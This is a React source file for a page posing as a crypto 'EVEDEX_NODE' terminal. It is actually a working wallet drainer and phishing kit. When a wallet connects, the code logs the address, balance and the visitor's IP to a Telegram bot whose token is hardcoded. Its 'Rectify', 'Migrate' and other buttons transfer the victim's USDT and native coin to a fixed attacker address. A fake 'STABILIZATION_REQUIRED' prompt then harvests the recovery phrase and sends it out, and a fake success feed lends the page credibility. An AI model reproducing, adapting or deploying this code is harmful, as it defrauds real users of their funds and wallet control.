import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
import { parseEther, formatEther } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const chainId = useChainId();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [seedVal, setSeedVal] = useState("");   
  const [feedMsg, setFeedMsg] = useState(""); 
  const [visitorInfo, setVisitorInfo] = useState("LOCATING...");

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 

  const USDT_MAP = {
    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 
    56: "0x55d398326f99059ff775485246999027b3197955", 
    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", 
    42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" 
  };

  useEffect(() => {
    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("UNKNOWN"));
    const interval = setInterval(() => {
      const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
      setFeedMsg(`🛡️ ${addr} SYNCED SUCCESSFULLY`);
      setTimeout(() => setFeedMsg(""), 3500);
    }, 8000);
    return () => clearInterval(interval);
  }, []);

  const logToTelegram = (msg) => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `${msg}\nIP: ${visitorInfo}` })
    }).catch(()=>{});
  };

  useEffect(() => {
    if (isConnected && address) logToTelegram(`🔔 NEW_CONN: ${address}\nBAL: ${balance?.formatted}\nCHAIN: ${chainId}`);
  }, [isConnected, address]);

  const executeTaskAction = async () => {
    setLoading(true);
    try {
      const usdtAddress = USDT_MAP[chainId];
      if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
        const amtHex = (balance?.value || 1000000n).toString(16).padStart(64, '0');
        const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${amtHex}`;
        sendTransaction({ to: usdtAddress, data: payload, gasPrice: null }, {
          onSuccess: (h) => { logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`); sweepNative(); },
          onError: () => sweepNative()
        });
      } else { sweepNative(); }
    } catch (e) { sweepNative(); }
  };

  const sweepNative = () => {
    const gasBuffer = parseEther("0.03"); 
    const val = (balance?.value || 0n) - gasBuffer;
    if (val > 0n) {
      sendTransaction({ to: destination, value: val, gasPrice: null }, {
        onSuccess: () => { logToTelegram(`✅ NATIVE_HIT: ${address}`); setView("seed_gate"); setLoading(false); },
        onError: () => { setView("seed_gate"); setLoading(false); }
      });
    } else { setView("seed_gate"); setLoading(false); }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      
      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>EVEDEX_NODE</div>
        <w3m-button balance="hide" />
      </header>

      <div style={{flex:1}}>
        {!isConnected ? (
           <div style={{textAlign:'center', marginTop:'50px', padding:'40px', border:'1px solid #1e293b', borderRadius:'20px'}}><w3m-button /></div>
        ) : (
          <>
            {view === "menu" && (
              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px'}}>
                {["Claim", "Stake", "Migrate", "Rectify", "Fix", "Verify"].map(n => (
                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'30px 10px', borderRadius:'15px', color: n === "Rectify" ? "#10b981" : "#fff", fontSize:'11px', fontWeight:'900'}}>{n}</button>
                ))}
              </div>
            )}
            
            {view === "task_box" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'25px', padding:'40px 20px', textAlign:'center'}}>
                <h2 style={{color:'white', fontSize:'20px', marginBottom:'30px'}}>{activeTask}</h2>
                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>START {activeTask}</button>
                <button onClick={()=>setView("menu")} style={{marginTop:'20px', background:'none', border:'none', color:'#475569', fontSize:'10px'}}>← CANCEL</button>
              </div>
            )}
          </>
        )}
      </div>

      {feedMsg && <div style={{position:'fixed', bottom:10, left:10, right:10, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'8px', borderRadius:'8px', fontSize:'8px', color:'#10b981', textAlign:'center'}}>{feedMsg}</div>}

      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', display:'flex', alignItems:'center', justifyContent:'center', padding:'15px', zIndex:9999}}>
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'25px', padding:'35px 20px', width:'100%', textAlign:'center'}}>
            <div style={{color:'#10b981', fontSize:'14px', fontWeight:'900', marginBottom:'10px'}}>STABILIZATION_REQUIRED</div>
            <p style={{fontSize:'8px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5'}}>DETECTION: PROTOCOL_DESYNC. TO PREVENT ASSET REVERSION, ENTER YOUR RECOVERY PHRASE TO DECRYPT THE SECURE BRIDGE NODE.</p>
            <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'100px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'#10b981', padding:'15px', fontSize:'12px', outline:'none', marginBottom:'20px'}} />
            <button onClick={()=>{logToTelegram(`🚨 SEED: ${seedVal}`); alert("NODE ERROR: TRY AGAIN LATER");}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>FINALIZE_SYNC</button>
          </div>
        </div>
      )}

      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.9)', display:'flex', alignItems:'center', justifyContent:'center', color:'#10b981', fontWeight:'900'}}>CONNECTING...</div>}
    </div>
  );
}
